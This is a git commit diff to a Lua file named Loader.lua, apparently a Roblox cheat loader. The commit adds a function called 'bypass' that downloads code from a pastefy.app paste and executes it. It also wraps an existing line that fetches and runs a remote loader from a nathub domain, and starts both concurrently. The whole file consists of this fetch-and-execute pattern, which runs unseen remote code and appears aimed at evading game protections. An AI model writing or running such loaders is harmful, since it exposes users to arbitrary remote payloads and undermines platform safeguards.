041fcbf2280a843910059aa37385323ca1581322
Lib <ybanezjosevincent.bshm.cpc@gmail.com>
2025-08-27 19:50:00 +0800

    Update Loader.lua

--- Loader.lua
+++ Loader.lua
@@ -1,1 +1,13 @@
+local function bypass()
+    
+loadstring(game:HttpGet("https://pastefy.app/2eieVein/raw"))()
+
+end
+local function loadui()
+  
 loadstring(game:HttpGet("https://get.nathub.xyz/loader"))()
+
+end
+
+task.spawn(bypass)
+task.spawn(loadui)
